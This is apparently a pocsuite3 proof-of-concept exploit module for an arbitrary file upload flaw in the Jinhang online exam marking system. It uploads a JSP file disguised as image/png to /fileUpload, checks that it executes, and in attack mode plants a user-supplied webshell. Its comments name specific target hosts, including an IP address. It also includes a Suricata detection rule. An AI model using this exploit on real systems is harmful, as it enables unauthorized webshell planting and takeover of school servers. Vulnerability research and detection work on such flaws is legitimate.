from pocsuite3.api import Output, POCBase, logger, VUL_TYPE, POC_CATEGORY, OrderedDict, OptString
from pocsuite3.api import register_poc,random_str
from pocsuite3.api import requests
import random
import string

def get_filename(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

class jinhang_LDY_2022_00137525(POCBase):
    # 非必填的字段，需保留字段名称，值为空
    vulID = 'LDY-2022-00137525'  # 必填，poc id，保持不变即可，后端会自动填写
    version = '1.0'  # 必填，poc版本，从1开始
    author = ['360漏洞云']  # 必填，作者
    vulDate = '2022-07-04'  # 必填，漏洞发布时间
    createDate = '2021-9-30'  # 必填，poc创建时间
    updateDate = '2023-01-30'  # 必填，poc更新时间

    name = 'jinhang_任意文件上传(GetShell)_LDY-2022-00137525'  # 必填，poc名称，格式 [app名称]_[漏洞名称]_[cve/cnvd号]
    CVE = ''  # 非必填，cve号，大写
    CNVD = ''  # 非必填，cnvd号，大写
    vulType = VUL_TYPE.UPLOAD_FILES  # 必填，漏洞类型，参考 pocsuite3 VUL_TYPE的取值范围
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # 必填，漏洞分类，参考 pocsuite3 POC_CATEGORY的取值范围
    severity = 'Critical'  # 必填，严重等级，取值范围 Critical , High , Medium, Low
    reqAuth = False  # 必填，boolen值，该漏洞验证或利用是否需要先认证

    appName = 'jinhang'  # 必填，该漏洞对应的应用名称
    fingerprintNames = ['jinhang']  # 必填，当命中哪些指纹后，可使用该poc。列表中是指纹的名称
    app_main_port = 80  # 必填，该应用的默认配置端口，用于快速扫描模式，若无法确认可以写80
    appVersion = '<=2018'  # 必填，漏洞影响的版本号

    appPowerLink = 'http://www.hsjinhang.com/'  # 非必填，应用厂商链接
    references = ['']  # 非必填，漏洞相关参考链接
    desc = '''金航网上阅卷系统可以提供以学生、班级、学校、年级、教师、科目、知识点等为测量依据的各种成绩分析报表，并能提供每个学生历次考试结果的综合分析。金航网上阅卷系统存在文件上传漏洞，攻击者可利用该漏洞获取系统权限'''  # 必填，漏洞描述，需尽量详细，参考cnnvd的写法 [应用简介]，[漏洞简介]
    suggest = '''厂商尚未提供漏洞修补方案，请关注厂商主页及时更新：http://www.hsjinhang.com/'''  # 必填，修复建议
    hasExp = True  # 必填，boolen值，是否包含exp
    targets = 'http://yj.ybwsxx.com.cn:8011'  # 必填，该Poc适用的目标，string类型 https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
    suricata_rules = 'alert tcp any any -> any any (msg:"jinhang_LDY_2022_00137525"; content:"fileUpload";sid:1;classtype:aes; metadata:aes_team_rules;)'  # 必填，suricata格式的检测规则

    def _options(self):
        o = OrderedDict()
        ## verify proxy feature  这三个参数是必须要有的，用于在目标无法出网的情况下的内网无回显漏洞验证，verify_send_url用于触发目标http请求，verify_check_url用于验证无回显漏洞，verify_proxy用于目标无法直连server的情况下走我们搭建的代理
        # o['verify_proxy'] = OptString('', description='对于无回显poc, 验证时curl要使用的socks5代理')
        # o['verify_send_url'] = OptString('', description='对于无回显poc, 验证时用于访问的url')
        # o['verify_check_url'] = OptString('', description='对于无回显poc, 验证时用于检查的url')
        ## verify proxy feature

        #o['command'] = OptString('whoami', description='攻击时自定义命令')
        # o["server_ip"] = OptString("", description='rmi、ldap等服务器的ip地址，用于特定场景下的attack或verify')
        # o["server_port"] = OptString("", description='rmi、ldap等服务器的端口，用于特定场景下的attack或verify')
        o["file_path"] = OptString("", description='待上传文件的绝对路径，一般是webshell文件，用于文件上传的attack')
        return o

    def _exploit(self, param=''):
        '''
        sudo python3 cli.py -r jinhang_LDY_2022_00137525 -u http://221.10.126.221:8088  --proxy http://127.0.0.1:8089
        '''
        # 使用 self._check() 方法检查目标是否存活，是否是关键词蜜罐。
        #if not self._check(dork=''):
        #    return False
        filename = get_filename() +'.jsp'
        url= self.url.rstrip("/")
        timeout = 3
        payload_url = url + "/fileUpload"
        shell_path = url + '/upload/' + filename
        headers = None
        payload_data = {'upload': (filename,param,"image/png")}
        try:
            requests.post(payload_url,files=payload_data,headers=headers,timeout=timeout, verify=False,allow_redirects = False)
            res = requests.get(shell_path,timeout=timeout, verify=False,allow_redirects = False)
            logger.debug(res.text)
            data = {"shell_path":shell_path,"resp":res.text }
            return data
        except Exception as e:
            logger.error(f"connect target '{self.url} failed!'")

    def _verify(self):
        result = {}
        url = self.url.rstrip("/")
        flag = random_str(6)
        param = f"echo {flag}"
        try:
            res = self._exploit(param)
            if flag in res['resp']:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['FILE_URL'] = res['shell_path']
        except Exception as e:
            pass
        return self.parse_output(result)

    def _attack(self):
        filename = get_filename()
        #param = self.get_option('command')
        with open(self.get_option("file_path"), "r") as f:
            f = str(f.read())
            param = f
        try:
            res = self._exploit(param)
            result = {}
            url = self.url.rstrip("/")
            payload_data = """11"""
            result['AttackInfo'] = {}
            result['AttackInfo']['URL'] = url
            result['AttackInfo']['FILE_URL'] = res['shell_path']
            #result['AttackInfo']['Stdout'] = res
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(jinhang_LDY_2022_00137525)

